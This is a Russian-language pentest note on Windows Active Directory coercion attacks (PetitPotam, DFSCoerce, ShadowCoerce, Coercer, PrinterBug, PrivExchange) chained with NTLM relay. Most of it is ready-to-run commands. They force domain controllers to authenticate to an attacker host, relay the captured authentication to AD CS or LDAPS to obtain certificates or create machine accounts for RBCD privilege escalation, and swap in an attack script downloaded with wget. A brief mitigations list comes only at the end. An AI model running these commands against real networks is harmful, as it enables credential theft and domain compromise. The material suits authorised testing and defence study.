#AD #windows #attacks #ntlm #coerce #auth #relay 

> Это класс атак **принудительной аутентификации**, позволяющий заставить Windows-систему (часто контроллер домена) аутентифицироваться на сервере атакующего через уязвимые RPC-протоколы, что приводит к утечке NTLM-хэшей

Злоупотребление аутентификацией и релеем
![[Use Coercion and Relay.png]]

### **Как проходит аутентификация:**
1. Аутентификация на удаленном компьютере с использованием действительных учетных данных домена (обычно по протоколу SMB).
2. Подключение к удаленному каналу SMB, например `\PIPE\netdfs`, `\PIPE\efsrpc`, `\PIPE\lsarpc`, или `\PIPE\lsass`.
3. Привязка к протоколу `RPC` для вызова его методов на произвольном целевом компьютере.

> Для выполнения HTTP аутентификации нам необходима работающая служба WebDAV 

```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=Testing FILENAME=@secret
```

## Оглавление
  - [[#Условия, необходимые для проведения Coerce-атаки:]]
  - [[#Проведение атаки Coerce]]
  - [[#1. PetitPotam (MS-EFSRPC)]]
  - [[#2. DFSCoerce (DFSNM)]]
  - [[#3. ShadowCoerce MS-FSRVP]]
  - [[#4. Coercer (универсальный)]]
  - [[#5. PrinterBug (MS-RPRN)]]
- [[#Проведение атаки]]
- [[#Митигации]]

---

### **Условия, необходимые для проведения Coerce-атаки:**

1. **Сетевая доступность** уязвимых портов (135/TCP, 445/TCP) между атакующим и целью
2. **Включенные соответствующие службы** на целевой системе (EFS, DFS, Spooler и т.д.)
3. **NTLM аутентификация** не отключена полностью в домене
4. **Отсутствие SMB Signing** на целевых системах (для Relay части)
5. **Уязвимая версия ОС** без соответствующих патчей

### **Проведение атаки Coerce**

1. **Разведка:** Обнаружение контроллеров домена или Windows-серверов в сети
2. **Выбор протокола:** Определение, какие уязвимые протоколы доступны (EFSRPC, DFSNM и т.д.)
3. **Инициация Coerce:** Отправка специального RPC-запроса, указывающего аутентифицироваться на сервер атакующего:
4. **Перехват хэшей:** Атакующий получает NTLM-хэши (или Kerberos-билеты)
5. **Relay или Crack:**
    - **[[NTLM Relay]]:** Пересылка хэшей на другую службу (LDAP, SMB, HTTP)
    - **Офлайн взлом:** Попытка взлома хэшей
6. **Эскалация привилегий:** Использование полученных учетных данных для повышения прав


# **Инструменты для Coerce-атак:**

### **1. PetitPotam** (MS-EFSRPC)

> **PetitPotam** эксплуатирует протокол **MS-EFSR** (Encrypting File System Remote Protocol) через функцию `EfsRpcOpenFileRaw`. Его задача — управление зашифрованными файлами по сети.

Улучшенная версия [PetitPotam](https://github.com/ly4k/PetitPotam)

До патча PetitPotam работала анонимна, но даже после патча с любой УЗ пользователя PetitPotam еще работает 

Эксплуатируем через SMB
```bash
# Базовое использование
python3 petitpotam.py <attacker_ip> <target_ip>

# С учетными данными
python3 .py -d domain.local -u user -p password <attacker_ip> <target_ip>

# Слушать хэши
impacket-ntlmrelayx -t ldap://dc.domain.local --no-smb-server
```

Эксплуатируем через HTTP, используя WebDAV
```bash
# Базовое использование
python3 petitpotam.py WIN-MMRQDG2R0ZX@80/files <target_ip> -u user -p password  
```
### **2. DFSCoerce** (DFSNM)

> Эксплуатирует протоколы распределенной файловой системы

> Не поддерживает аутентификацию по HTTP

```bash
python3 dfscoerce.py -d domain -u user -p pass <attacker_ip> <target_ip>
```

### **3. ShadowCoerce MS-FSRVP**

> Этот метод использует протокол **File Server Remote VSS Protocol**. Он нужен, чтобы управлять «теневыми копиями» (бэкапами) файлов на удаленных серверах.

Ты просишь сервер создать теневую копию или подключиться к ней, указывая свой IP.

```bash
python3 shadowcoerce.py -d domain.local -u user -p pass <victim_ip> <attacker_ip>
```

### **4. Coercer** (универсальный)

```bash
# Сканирование всех методов (достаточно тихий)
coercer scan -u user -p password -d domain.local -t dc01.domain.local -v

# Принудительная аутентификация через SMB
coercer coerce -u user -p password -d domain.local -t dc01.domain.local -l <attacker_ip> --always-continue

# Принудительная аутентификация через HTTP
coercer coerce -u user -p password -d domain.local -t dc01.domain.local -wh SUPPORTPC2 -wp 80

# Аудит
coercer audit -d domain.local -u auditor -p "P@ssw0rd" --output report.html
```

### **5. PrinterBug** (MS-RPRN)

> Эксплуатирует службу печати (Spooler) + Запущена по умолчанию везде

Обнаруживаем службу печати `Spooler`
```bash
nxc smb 192.168.1.0/24 -u 'user' -p 'pass' -M spooler
```

Эксплуатируем через SMB
```bash
SpoolSample.exe <target> <attacker_ip>
# или
python3 printerbug.py domain/user:password@target <attacker_ip>
# или
python3 dementor.py -u 'username' -p 'password' -d 'domain.local' <ip_attacker><ip_victim>
```

Эксплуатируем через HTTP, используя WebDAV
```bash
python3 printerbug.py domain/user:password@target ATTACKER_MACHINE_NAME@PORT/PATH
```
- `ATTACKER_MACHINE_NAME` должно быть именем `NetBIOS` или `DNS` компьютера злоумышленника (`Responder` предоставляет его по умолчанию при запуске); однако, поскольку `Responder` в любом случае будет отравлять широковещательный трафик, мы задаем для него произвольную строку. В нашем случае мы зададим `SUPPORTPC`.
- `PORT` указывает произвольный порт, который служба `WebDAV` будет использовать для подключения к атакующему компьютеру. В нашем случае мы зададим `80`.
- `PATH` указывает произвольный путь, по которому служба `WebDAV` попытается подключиться. В нашем случае мы зададим `print`

### **6) PushSubscription Abuse**

> PushSubscription - это API веб-служб Exchange, который позволяет подписываться на push-уведомления. Злоумышленники злоупотребляют им, чтобы заставить серверы Exchange проходить аутентификацию у выбранной ими цели

Инструмента [PrivExchange.py](https://github.com/dirkjanm/privexchange/)

```bash
privexchange.py -d "$DOMAIN" -u "$DOMAIN_USER" -p "$PASSWORD" -ah "$ATTACKER_IP" "$EXCHANGE_SERVER_TARGET"
```

Если учетных данных нет используем этот инструмент [httpattach.py](https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py)

```bash
cd /PATH/TO/impacket/impacket/examples/ntlmrelayx/attacks/httpattack.py
mv httpattack.py httpattack.py.old
wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py
sed -i 's/attacker_url = .*$/attacker_url = "$ATTACKER_URL"/' httpattack.py
cd /PATH/TO/impacket
pip3 install .
ntlmrelayx.py -t "https://$EXCHANGE_HOST/EWS/Exchange.asmx"
```

# Проведение атаки

```bash
# 1. Запуск перехватчика
# Поднимаем релей-сервер с таргетом на AD CS
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

impacket-ntlmrelayx -t ldaps://dc.domain.local --add-computer --delegate-access


# 2. Принуждаем DC (10.0.0.1) аутентифицироваться на нашем IP (10.0.0.5) 
coercer coerce -u low_priv_user -p password -d domain.local -l 10.0.0.5 -t 10.0.0.1

# 3. DC аутентифицируется на [192.168.1.100](10.0.0.1)
# 4. ntlmrelayx получает хэши и создает компьютерную учетку
# 5. Получаем права администратора через RBCD
```
## Митигации

1) Отключение уязвимых служб Spooler, EFS, DFS
2) SMB-Signing
3) Отключение NTLM
4) Мониторинг событий
- **Event ID 4624** (Type 3 аутентификация) с необычными исходящими подключениями
- **Event ID 4648** (явные учетные данные) с аутентификацией NTLM